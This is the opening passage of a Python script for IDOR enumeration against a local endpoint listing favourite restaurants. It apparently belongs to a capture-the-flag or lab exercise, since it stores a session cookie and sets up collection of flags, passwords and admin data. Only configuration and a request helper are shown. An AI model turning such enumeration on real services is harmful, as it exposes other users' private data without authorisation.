import requests
import re
import time

# Configuration
target_url = "http://127.0.0.1:33156"
endpoint_path = "/api/get_favorite_restaurants.php"
cookie_value = "j2jbue9ik42nla625rupl7v2jk"

# Results storage
results = []
flags_found = []
password_info = []
admin_data = None

def safe_request(url, cookies, max_retries=1):
    """Make a request with error handling"""
    for attempt in range(max_retries):
        try:
            resp = requests.get(
                url,
                cookies=cookies,
                timeout=15,
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False
            )
            return resp
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2)
            else:
                print(f"  Error: {str(e)}")
    return None

print("="*80)
print("IDOR Enumeration - Testing /api/get_favorite_restaurants.php")
print("="*80)
print()

# Test connection first
print("[1] Testing base connectivity...")
try:
